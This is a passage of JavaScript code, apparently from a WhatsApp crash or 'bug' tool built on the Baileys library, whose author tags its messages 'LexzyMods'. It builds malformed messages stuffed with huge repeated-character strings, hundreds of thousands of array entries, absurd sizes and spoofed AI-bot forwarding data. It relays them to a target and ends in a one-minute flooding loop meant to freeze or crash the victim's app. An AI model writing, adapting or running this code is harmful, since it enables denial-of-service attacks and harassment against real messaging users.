      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135555555@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 999999999,
      thumbnailWidth: 9999999999,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "9990099",
      stickerPackOrigin: "USER_CREATED"
    }
  };

  await sock.relayMessage(target, b, {});

  const c = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Students Func Nanas",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.9999999999999,
              name: "LexzyMods",
              address: "X",
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "LexzyMods - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "address_message",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "ြ ".repeat(75000),
              },
            ],
            messageParamsJson: "wa.me/stickerpack/LexzyMods",
            messageVersion: 1,
          },
        },
      },
    },
  };

  await sock.relayMessage(target, c, {});

  const d = {
    groupStatusMessageV2: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          caption: "LexzyMods - Executed¿!",
          fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
          fileLength: "1099511627776",
          seconds: 172800,
          mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
          height: 1080,
          width: 1920,
          fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
          directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1774428565",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIQQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
          annotations: [
            {
              polygonVertices: [
                {
                  x: 0.17499999701976776,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.3379453122615814
                },
                {
                  x: 0.824999988079071,
                  y: 0.6620468497276306
                },
                {
                  x: 0.17499999701976776,
                  y: 0.6620468497276306
                }
              ],
              shouldSkipConfirmation: true,
              embeddedContent: {
                embeddedMusic: {
                  musicContentMediaId: "2261401457948346",
                  songId: "849859527815275",
                  author: "Lexcaabos - Executed¿!" + "ြ".repeat(9000),
                  title: "ြ".repeat(75000),
                  artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                  artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                  artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                  artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                  artistAttribution: "https://www.instagram.com/_u/lexzymods",
                  countryBlocklist: "WEs=",
                  isExplicit: false
                }
              },
              embeddedAction: true
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, d, {});

  const bot = "867051314767696@bot";

  const e = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,

          submessages: [
            {
              messageType: 2,
              messageText: `@${bot.split("@")[0]}`
            },

            {
              messageType: 5,
              codeMetadata: {
                codeLanguage: "javascript",

                codeBlocks: [
                  {
                    highlightType: 1,
                    codeContent: "const = {"
                  },
                  {
                    highlightType: 2,
                    codeContent: "Lexcaabos - Executed¿!"
                  },
                  {
                    highlightType: 3,
                    codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                  }
                ]
              }
            }
          ],

          contextInfo: {
            mentionedJid: [bot],

            featureEligibilities: Array.from(
              { length: 1999 },
              () => ({
                canReceiveMultiReact: true
              })
            ),

            isForwarded: true,

            forwardedAiBotMessageInfo: {
              botJid: bot
            },

            forwardOrigin: 4
          }
        }
      }
    }
  };

  await sock.relayMessage(target, e, {});

  const g = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Lexcaabos - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({}))
          }
        }
      }
    }
  };

  const gMsg = generateWAMessageFromContent(target, g, {});

  await sock.relayMessage(target, gMsg.message, {
    participant: true,
    messageId: gMsg.key.id
  });

  const f = {
    newsletterAdminInviteMessage: {
      newsletterJid: "228773882@newsletter",
      newsletterName: "NanasMuda" + "ြ".repeat(75000),
      caption: "Pt Func Tergacorr" + "ြ".repeat(50000),
      inviteExpiration: Date.now() + 1814400000,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
            ],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Lexzy Ganteng"
              }
            }
      },
    },
  };

  await sock.relayMessage(target, f, {
    participant: true,
  });

  const tombol = [
      {
          name: "single_select",
          buttonParamsJson: "ြ ".repeat(9000),
      },
  ];
      tombol.push(
          {
              name: "cta_call",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          },
          {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
              }),
          }
      );

  const i = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
            hasMediaAttachment: true,
          },
          body: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          footer: {
            text: "ꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸꦸ".repeat(9000),
          },
          nativeFlowMessage: {
            buttons: tombol
          },
          contextInfo: {
            forwardingScore: 2147483647,
            isForwarded: true,
            isSampled: true,
            expireAt: 253402300799000,
            participant: target,
            remoteJid: "status@broadcast",
            stanzaId: "ြ".repeat(10000),
            deviceListMetadata: {
              senderKeyHash: "ြ".repeat(7000),
              senderTimestamp: "9999999999999",
              recipientKeyHash: "ြ".repeat(6000),
              recipientTimestamp: "8888888888888",
              userIdentity: "ြ".repeat(4000)
            },
            botInvocationMetadata: {
              botId: "exploit_bot@",
              invocationType: "BOT_INVOCATION_TYPE_QUERY",
              invocationSource: "BOT_INVOCATION_SOURCE_QUICK_REPLY",
              botMessageSecret: "ြ".repeat(4000)
            },
            quotedMessage: {
              extendedTextMessage: {
                text: "\x10".repeat(1000),
                contextInfo: {
                  forwardingScore: 999999,
                  isForwarded: true,
                  stanzaId: "ꦽ".repeat(10000),
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  deviceListMetadata: {
                    senderKeyHash: "ꦽ".repeat(1000),
                    recipientKeyHash: "ꦽ".repeat(1000)
                  }
                }
              }
            },
            conversionSource: "ꦽ".repeat(9000),
            conversionData: Buffer.from("ꦽ".repeat(1000)),
            conversionDelaySeconds: 2147483647,
            externalAdReply: {
              title: "ꦽ".repeat(2000),
              body: "ꦽ".repeat(2000),
              mediaType: "IMAGE",
              thumbnailUrl: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ/0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7yNpExH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
              mediaUrl: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
              sourceUrl: "t.me/LexzyModss",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, i, {
    participant: true,
    messageId: generateId()
  });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "LexzyMods - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u0000",
          },
          nativeFlowMessage: {
            buttons: "[".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "iniochamy - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\u200B",
          },
          nativeFlowMessage: {
            buttons: "]".repeat(9000),
          }
        }
      }
    }
  }, { participant: true })

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mimetype: "image/jpeg",
              caption: "ochalex - Executed¿!",
              fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
              fileLength: "634893",
              height: 1022,
              width: 1080,
              mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
              fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
              directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
              mediaKeyTimestamp: "1782643133",
              jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
              hasMediaAttachment: true
            }
          },
          body: {
            text: "\uFFFC",
          },
          nativeFlowMessage: {
            buttons: "{}".repeat(7500),
          }
        }
      }
    }
  }, { participant: true })

  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mimetype: "image/jpeg",
                caption: "LexzyMods - Iniochamy¿!",
                fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
                fileLength: "634893",
                height: 1022,
                width: 1080,
                mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
                fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
                directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                mediaKeyTimestamp: "1782643133",
                jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                hasMediaAttachment: true
              }
            },
            body: {
              text: "\u0000",
            },
            nativeFlowMessage: {
              buttons: "[]".repeat(9000),
            }
          }
        }
      }
    }, { participant: true })
  }
}

async function LockSww(sock, target) {
  const generateId = () => Math.random().toString(36).substring(2, 15);

  const msg = {
    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
    message: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "LexzyModss - Executed¿!",
        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        fileLength: 9999999,
        height: 9999,
        width: 9999,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQCAQUBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA8xd08q1UTizoenMSK1a9WaMkNT3ZrFyc7nOmsY2rtlXZWZ3ooDzQNY6AaAP/xAAcEAADAAMBAQEAAAAAAAAAAAAAAQIDEBESEyD/2gAIAQEAAT8AyRwlDRS1lnp54UU9XRVlWd1ksqt9MjEunyfDyeRvpjJ5wySN6TJsp+j5tnToqFZjufyqaP/EABkRAAIDAQAAAAAAAAAAAAAAAAEQABEgAv/aAAgBAgEBPwBjA6dSzj//xAAaEQACAgMAAAAAAAAAAAAAAAABAhAgABEh/9oACAEDAQE/AJNCvJDZqn//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true,
          paymentExtendedMetadata: {
            type: 1,
            platform: "windowshortcut"
          },
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 280000 }, () => ({
              "\u200B": "\u0000"
            }))
          },
          businessMessageForwardInfo: {
            businessOwnerJid: target
          }
        },
        streamingSidecar: "ifzqbbi6VQrr2qWUVcibCLLD5MublGIUI7VQWllrtSH0Oy9Oom8Fsw==",
        thumbnailDirectPath: "/v/t62.36147-24/597931020_1114136300619238_2132267882477762526_n.enc?ccb=11-4&oh=01_Q5Aa3QE3WwujMWlYXtHm0OsWvWU7G2iNPANw9Cpt64aOcOvNrg&oe=695F14B4&_nc_sid=5e03e0",
        thumbnailSha256: "ewOlFHMaQjWVM2MIHgdLESHC9lTe8wqHoRl5StiLkhM=",
        thumbnailEncSha256: "Vf7tqUV/U7cF064u4mVf9/b78ud+Ds3OS2AUwPOs5xE=",
        annotations: [
          {
            polygonVertices: [
              { x: 0.04808333143591881, y: 0.3758828043937683 },
              { x: 0.9397777915000916, y: 0.3758828043937683 },
              { x: 0.9397777915000916, y: 0.6241093873977661 },
              { x: 0.04808333143591881, y: 0.6241093873977661 }
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMessage: {
                stanzaId: "AC2FA3391836A5F431C9048A1146D3B5",
                message: {
                  extendedTextMessage: {
                    text: "👁‍🗨⃟‌‌LexzyMods - Executed¿! ⌁ ꪸ⃟‼️",
                    previewType: "NONE",
                    inviteLinkGroupTypeV2: "DEFAULT"
                  },
                  messageContextInfo: {
                    messageSecret: "/M7rquUfS6CESB44pG4gkIEnJXmWCj0TWplGd5anYpI=",
                    messageAssociation: {
                      associationType: 16,
                      parentMessageKey: {
                        remoteJid: "13135550202@bot",
                        fromMe: false,
                        id: "AC911EFEDA42DEA4586C4BB8C2814563",
                        participant: "13135550202@bot",
                      }
                    }
                  }
                }
              }
            },
            embeddedAction: true
          },
          {
            polygonVertices: [
              { x: 0.2779604196548462, y: 0.3697652220726013 },
              { x: 0.6993772983551025, y: 0.43257278203964233 },
              { x: 0.6015534996986389, y: 0.6402503848075867 },
              { x: 0.180136576294899, y: 0.5774427652359009 }
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1906813674047253",
                songId: "1137812656623908",
                author: "𑲱".repeat(9000),
                title: "𑲱🗨⃟".repeat(9000),
                artworkDirectPath: "/v/t62.76458-24/598391103_3273009980213184_2759326202399655865_n.enc?ccb=11-4&oh=01_Q5Aa3QGnx-UJjjZjgAcBWAO2Z_fjAVSkr6_6Trx2fPX0bUWq_Q&oe=695F194E&_nc_sid=5e03e0",
                artworkSha256: "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
                artworkEncSha256: "RxkYiV5YBTTkodlBT20qVHazbrBipHBCLb5t9BWuaXo=",
                artistAttribution: "https://t.me/lexcamyy",
                countryBlocklist: "UlU=",
